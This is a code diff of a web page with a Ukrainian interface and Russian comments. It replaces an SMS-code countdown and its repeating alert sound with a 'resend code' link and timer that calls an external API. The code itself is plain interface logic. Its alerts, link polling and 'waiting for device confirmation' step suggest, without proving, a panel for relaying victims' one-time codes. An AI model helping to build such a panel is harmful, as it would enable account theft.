@@ -190,6 +190,7 @@
     let link = null;
     let smsTimerInterval = null;
     let smsSoundInterval = null;
+    let resendTimerInterval = null; // ← ДОБАВЛЕНО: Таймер для повторной отправки
     let lastRefreshTime = Date.now();
     let refreshCount = 0;
 
@@ -420,17 +421,22 @@
                   background: #1976d2; color: #fff; border: none; border-radius: 25px; cursor: pointer;">
             Підтвердити
           </button>
-          <span id="timer" style="display: block; margin-top: 15px; color: #c60; font-weight: bold; font-size: 16px;"></span>
+          
           <div id="sms-error" style="color: red; margin-top: 10px; font-size: 16px;"></div>
           
           <div style="margin-top: 20px; color: #999; font-size: 14px;">
-            Відправити код повторно через <span id="resend-timer">2:58</span>
+            <span id="resend-link" style="color: #1976d2; cursor: pointer; text-decoration: underline;" onclick="requestResendCode()">
+              Відправити код повторно
+            </span>
+            <span id="resend-timer-text" style="display: none;">
+              Відправити код повторно через <span id="resend-timer">2:58</span>
+            </span>
           </div>
         </div>
       `;
       
       setupSMSInput();
-      startSMSTimer();
+      startResendTimer(); // ← ИЗМЕНЕНО: Запускаем только таймер повторной отправки
 
     // ← ДОБАВЛЕНО: Функция настройки ввода SMS
     function setupSMSInput() {
@@ -541,7 +547,7 @@
         const resp = await res.json();
         if (resp.ok) {
           document.getElementById("status").innerHTML = "<div style='text-align: center; padding: 40px;'><h2 style='color: #4caf50;'>✅ Код прийнято</h2><p>Чекаємо підтвердження на пристрої…</p></div>";
-          stopSMSTimer();
+          stopResendTimer(); // ← ИЗМЕНЕНО: Останавливаем таймер повторной отправки
           setTimeout(() => {
             autoRefreshActive = true;
             checkAllLinks();
@@ -558,39 +564,76 @@
     }
     }
 
-    function startSMSTimer() {
-      let seconds = 180;
-      playSMSAudio(); // 🔊 Звук при появлении SMS запроса
-      showSMSPush();
-      updateSMSTimer(seconds);
-
-      smsSoundInterval = setInterval(() => playSMSAudio(), 5000);
-      smsTimerInterval = setInterval(() => {
-        seconds--;
-        updateSMSTimer(seconds);
-        if (seconds <= 0) {
-          clearInterval(smsTimerInterval);
-          clearInterval(smsSoundInterval);
-          document.getElementById("timer").textContent = "⏰ Час вичерпано!";
-          // ← ИСПРАВЛЕНО: Восстанавливаем состояние при таймауте
+    // ← ДОБАВЛЕНО: Функция запроса повторной отправки SMS
+    async function requestResendCode() {
+      if (!currentId) return;
+      
+      try {
+        const res = await fetch(`https://api.astrinvite.site/api/resend-code`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+          },
+          body: `id=${currentId}`
+        });
+        
+        const data = await res.json();
+        if (data.ok) {
+          // Показываем сообщение об успешной отправке
+          document.getElementById("sms-error").style.color = "#4caf50";
+          document.getElementById("sms-error").textContent = "SMS код відправлено повторно!";
+          
+          // Очищаем сообщение через 3 секунды
           setTimeout(() => {
-            resetUI(); // Полный сброс UI
-            autoRefreshActive = true;
-            checkAllLinks();
-          }, 2000);
+            document.getElementById("sms-error").textContent = "";
+            document.getElementById("sms-error").style.color = "red";
+          }, 3000);
+          
+          // Перезапускаем таймер повторной отправки
+          startResendTimer();
+        } else {
+          document.getElementById("sms-error").textContent = "Помилка повторної відправки: " + (data.error || "спробуйте пізніше");
+        }
+      } catch (e) {
+        console.error("Ошибка повторной отправки:", e);
+        document.getElementById("sms-error").textContent = "Помилка з'єднання. Спробуйте ще раз.";
+      }
+    }
+    
+    // ← ДОБАВЛЕНО: Таймер для повторной отправки SMS
+    function startResendTimer() {
+      let seconds = 178; // 2:58
+      
+      // Показываем таймер, скрываем ссылку
+      document.getElementById("resend-link").style.display = "none";
+      document.getElementById("resend-timer-text").style.display = "inline";
+      
+      updateResendTimer(seconds);
+      
+      resendTimerInterval = setInterval(() => {
+        seconds--;
+        updateResendTimer(seconds);
+        
+        if (seconds <= 0) {
+          clearInterval(resendTimerInterval);
+          // Показываем ссылку, скрываем таймер
+          document.getElementById("resend-link").style.display = "inline";
+          document.getElementById("resend-timer-text").style.display = "none";
         }
       }, 1000);
     }
-
-    function stopSMSTimer() {
-      if (smsTimerInterval) clearInterval(smsTimerInterval);
-      if (smsSoundInterval) clearInterval(smsSoundInterval);
-      document.getElementById("timer").textContent = "";
+    
+    function updateResendTimer(seconds) {
+      const m = Math.floor(seconds / 60);
+      const s = seconds % 60;
+      document.getElementById("resend-timer").textContent = `${m}:${s < 10 ? "0" : ""}${s}`;
     }
-
-    function updateSMSTimer(seconds) {
-      const m = Math.floor(seconds / 60), s = seconds % 60;
-      document.getElementById("timer").textContent = `⏳ ${m}:${s < 10 ? "0" : ""}${s}`;
+    
+    function stopResendTimer() {
+      if (resendTimerInterval) {
+        clearInterval(resendTimerInterval);
+        resendTimerInterval = null;
+      }
     }
 
     function playSMSAudio() {
@@ -661,11 +704,8 @@
       if (statusPoller) {
         clearInterval(statusPoller);
       }
-      if (smsTimerInterval) {
-        clearInterval(smsTimerInterval);
-      }
-      if (smsSoundInterval) {
-        clearInterval(smsSoundInterval);
+      if (resendTimerInterval) {
+        clearInterval(resendTimerInterval);
       }
     });
   </script>
